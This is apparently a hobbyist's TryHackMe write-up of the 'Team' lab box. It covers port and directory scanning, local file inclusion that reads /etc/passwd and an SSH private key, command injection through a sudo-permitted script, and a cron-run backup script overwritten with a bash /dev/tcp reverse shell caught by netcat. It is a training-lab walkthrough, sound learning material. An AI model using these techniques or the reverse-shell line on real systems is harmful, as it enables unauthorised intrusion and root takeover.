# TryHackMe write-ups

I joined TryHackMe on Jan 2021, I treat it as a hobby, something I do on weekends and after work to learn cybersecurity from the practical point of view.

## Team - A beginner friendly boot2root

The THM link: https://tryhackme.com/room/teamcw.

### First scouting
While it sounds reasonable that this box is beginner friendly, it took me around 2 days to root. The first clue is right there in the index page that I completely skipped around a thousand times because it looks exactly like the ubuntu default apache page. One Caveat though the title says:
```
    <title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>
```
Then it hits you like a ton of bricks... you just have to add team.thm to your /etc/hosts file.

But before that, let's run some nmap to see what network services is it running.

```
$ sudo nmap -sS 10.10.X.X
Starting Nmap 7.91 ( https://nmap.org ) at REDACTED
Nmap scan report for team.thm (10.10.X.X)
Host is up (0.048s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.38 seconds
```
So now we know we have http, ftp and ssh running on this box. As with other TryHackMe challenges, this services combined often offer more than 1 attack vector. In this post I'll expose just 1 approach.

### Exploring the team site

if we explore the team.thm site now with gobuster:

```
$ gobuster dir -u team.thm -x txt,php -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

A couple of things stands out:
```
===============================================================
2021/03/07 17:46:09 Starting gobuster
===============================================================
/images (Status: 301)
/scripts (Status: 301)
/assets (Status: 301)
/robots.txt (Status: 200)
```
The robots.txt file content is "dale", we pencil that down, it might be useful further down the line.

```
$ curl http://team.thm/robots.txt
dale
```
The /scripts directory there... is not linked from the web page... we should dig deeper.

```
$ gobuster dir -u team.thm/scripts/ -x txt,php -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
...
/script.txt (Status: 200)
```
The result is interesting, a nice script.txt with valuable content

```
$ curl http://team.thm/scripts/script.txt

#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```
Now the content of the file is telling us that the file script.old has the credentials for the ftp server. Small disclaimer here, I haven't found the script.txt or script.old files until I already had user access to the box, though I'm including this steps as anyone else could have found it and I think the box is more beginner friendly if you find this evidence first.

### Exploring the ftp content
After getting inside the ftp we found a file named New_site.txt.
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15 20:25 workshare
226 Directory send OK.
ftp> cd workshare
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 1002     1002          269 Jan 15 20:24 New_site.txt
226 Directory send OK.
ftp> get New_site.txt
local: New_site.txt remote: New_site.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for New_site.txt (269 bytes).
226 Transfer complete.
269 bytes received in 0.01 secs (21.4480 kB/s)
```
Let's have a look at the content...
```
$ cat New_site.txt 
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.
```

Whoohoo!, the text file reveals two important things: 
1. the existence of the dev subdomain, and 
2. the fact that we might be able to find the private key for the user dale in the relevant config file...

With this in mind we'll look at that dev subdomain first.

### Looking at the dev site
First things first, we add another entry in /etc/hosts to dev.team.thm.

Now let's have a look at the dev version of the site:
```
$ curl dev.team.thm
<html>
 <head>
  <title>UNDER DEVELOPMENT</title>
 </head>
 <body>
  Site is being built<a href=script.php?page=teamshare.php </a>
<p>Place holder link to team share</p>
 </body>
</html>
```
we can see a link to script.php?page=teamshare.php
```
$ curl http://dev.team.thm/script.php?page=teamshare.php

<html>
 <head>
  <title>Team Share</title>
 </head>
 <body>
  Place holder for future team share </body>
</html>
```
it seems that script.php has some code to include the contents of teamshare.php, as the same content can be obtained by browsing teamshare.php directly
```
$ curl http://dev.team.thm/teamshare.php
```
This smells like local file inclusion... let's try something simple
```
http://dev.team.thm/script.php?page=/etc/passwd
```
The simplest case of lfi, it works with absolute paths, how nice. From the output we found some interesting data:

```
$ curl -s http://dev.team.thm/script.php?page=/etc/passwd |grep sh
root:x:0:0:root:/root:/bin/bash
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
```
So now we know in the box, the users root, dale, gyles, and ftpuser can spawn a login shell. We did know about dale and ftpuser but gyles is new to us... Pencil that down as well, it might play its part later on.

Now if we remember we might find dale's private key in the relevant config file... Now this box had http, ftp and ssh services and we know PKI authentication is often set up in ssh, let's try to use the LFI vulnerability we've just found on the sshd config file:

```
$ curl -s http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
```
Right, as we were expecting... Dale left his private key in the relevant file.

### The user Dale
The dale user will give us the user flag, a much expected one after all this work:
```
$ ssh -i dale_id_rsa dale@dev.team.thm
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ ls
user.txt
dale@TEAM:~$ cat user.txt 
```
One of the first things I do after landing on a user shell is:
1. ls -la to see where I am and what kind of environment we have at hand
```
dale@TEAM:~$ ls -la
total 44
drwxr-xr-x 6 dale dale 4096 Jan 15 22:34 .
drwxr-xr-x 5 root root 4096 Jan 15 20:21 ..
-rw------- 1 dale dale 2549 Jan 21 19:20 .bash_history
-rw-r--r-- 1 dale dale  220 Jan 15 19:52 .bash_logout
-rw-r--r-- 1 dale dale 3771 Jan 15 19:52 .bashrc
drwx------ 2 dale dale 4096 Jan 15 19:54 .cache
drwx------ 3 dale dale 4096 Jan 15 22:20 .gnupg
drwxrwxr-x 3 dale dale 4096 Jan 15 21:29 .local
-rw-r--r-- 1 dale dale  807 Jan 15 19:52 .profile
drwx------ 2 dale dale 4096 Jan 15 20:15 .ssh
-rw-r--r-- 1 dale dale    0 Jan 15 19:55 .sudo_as_admin_successful
-rw-rw-r-- 1 dale dale   17 Jan 15 21:30 user.txt
```
This is gold, is telling us that this user is able to run sudo. There is a load of useful things in that .bash_history that I'm going to skip here for now.
2. I always run sudo -l, always.... Have I said always? always... I think you get it.
```
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```
And this gives us more gold than we could have asked for, the user dale can run the command admin_checks as the user gyles without having to provide the password. Thanks, this could be our way to root... Now what is in that file admin_checks, can we see it?
```
$ ls -la /home/gyles/admin_checks
-rwxr--r-- 1 gyles editors 399 Jan 15 21:52 /home/gyles/admin_checks
```
```
$ cat /home/gyles/admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```
We can read the file, and the code seems to have a bug we can leverage on. The line
```$error 2>/dev/null```
is effectively executing anything that the user entries, sending the standard error to /dev/null. Let's see what we can do from here:

```
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: nonimportant
Enter 'date' to timestamp the file: bash
The Date is id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```
Yes, so we got a shell as the user gyles now and this user is in admin group... We are in the right track, this deserves a new section.

### The user Gyles
Now if you explore the filesystem, you'll find some files that this user or group can edit but I really wasn't able to understand how to use them until I looked at the gyles .bash_history:
```
...
ls -la
su root
id
cd /opt
ls -la
cd admin_stuff/
ls
./blog_backup.sh 
clear
...
```
The directory admin_stuff stands out, let's have a look:

```
cd /opt/admin_stuff
ls
script.sh
```
A script.sh file, we definitely want to look at its content:
```
cat script.sh
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```
Thank you very much admin. This script.sh is cronned to run each minute. It runs 2 backups, one for the dev_site and one for the main_site. let's have a look at those:

```
ls -l /usr/local/sbin/dev_backup.sh
-rwxr-xr-x 1 root root 64 Jan 17 19:42 /usr/local/sbin/dev_backup.sh
ls -l /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17 20:36 /usr/local/bin/main_backup.sh
```
We can see that the main_backup.sh file, can be modified by anyone in the admin group and gyles is in the admin group... That is our attack vector to root the box

### Getting the root shell
This step is not required at all, you can simply modify the above script to cat the contents of the flag into a file that you can read, but I added it just to illustrate the concept.
We can get a root shell by modifying the main_backup.sh script.
```
echo "bash -i >& /dev/tcp/10.9.X.X/1234 0>&1" > /usr/local/bin/main_backup.sh
```

In the attacker box you need to have netcat listening on port 1234:
```
nc -nlvp 1234
```

And that is all, after waiting some seconds the shell pops up:
```
listening on [any] 1234 ...
connect to [10.9.X.X] from (UNKNOWN) [10.10.X.X] 59870
bash: cannot set terminal process group (2465): Inappropriate ioctl for device
bash: no job control in this shell
root@TEAM:~#
```
From there we can grab the root flag:
```
root@TEAM:~# cat root.txt
```


